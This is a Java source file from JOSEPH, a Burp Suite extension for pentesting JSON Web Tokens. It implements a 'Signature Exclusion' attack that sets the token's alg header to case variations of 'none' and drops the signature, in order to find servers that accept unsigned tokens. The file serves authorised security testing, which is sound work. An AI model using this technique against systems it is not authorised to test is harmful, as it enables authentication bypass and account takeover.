/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks;

import burp.*;
import eu.dety.burp.joseph.exceptions.AttackPreparationFailedException;
import eu.dety.burp.joseph.utilities.Decoder;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;

public class SignatureExclusionInfo implements IAttackInfo {
    private Decoder joseDecoder;
    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private IParameter parameter;

    // Unique identifier for the attack class
    private static final String id = "signature_exclusion";
    // Full name of the attack
    private static final String name = "Signature Exclusion";
    // List of types this attack is suitable for
    private static final List<String> suitableTypes = Arrays.asList("jwt", "jws");
    // Array of "none" algorithm type variations
    private static final String[] noneAlgVariations = {"none", "None", "NONE", "nOnE"};
    // Amount of requests needed
    private static final int amountRequests = noneAlgVariations.length;

    private HashMap<String, byte[]> requests = new HashMap<>();

    @Override
    public SignatureExclusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, IParameter parameter) throws AttackPreparationFailedException {
        this.joseDecoder = new Decoder();
        this.helpers = callbacks.getHelpers();
        this.requestResponse = requestResponse;
        this.parameter = parameter;

        for (String noneAlgVariation : noneAlgVariations) {
            try {
                // Change the "alg" header value for each of the noneAlgVariation entries
                // and rebuild a valid request
                byte[] tmpRequest = this.requestResponse.getRequest();
                String[] tmpComponents = joseDecoder.getComponents(this.parameter.getValue());
                String tmpDecodedHeader = joseDecoder.getDecoded(tmpComponents[0]);
                String tmpReplaced = tmpDecodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + noneAlgVariation + "\"");
                String tmpReplacedEncoded = joseDecoder.getEncoded(tmpReplaced);
                String[] tmpNewComponents = {tmpReplacedEncoded, tmpComponents[1], ""};
                String tmpParameterValue = joseDecoder.concatComponents(tmpNewComponents);

                IParameter tmpParameter = helpers.buildParameter(this.parameter.getName(), tmpParameterValue, this.parameter.getType());
                tmpRequest = helpers.updateParameter(tmpRequest, tmpParameter);

                requests.put(noneAlgVariation, tmpRequest);
            } catch (Exception e) {
                throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
            }
        }

        return new SignatureExclusion(callbacks, this);
    }

    @Override
    public String getId() {
        return id;
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public List<String> getSuitableTypes() {
        return suitableTypes;
    }

    @Override
    public int getAmountRequests() {
        return amountRequests;
    }

    @Override
    public boolean isSuitable(String type, String algorithm) {
        if(type != null && !type.equals("")) {
            return this.getSuitableTypes().contains(type.toLowerCase());
        }

        // TODO: Guessing / further checks if type is null
        return false;
    }

    /**
     * Get IHttpRequestResponse object used for this attack
     * @return IHttpRequestResponse object
     */
    IHttpRequestResponse getRequestResponse() {
        return this.requestResponse;
    }

    /**
     * Get list of prepared requests
     * @return Byte array list of requests
     */
    HashMap<String, byte[]> getRequests() {
        return this.requests;
    }
}
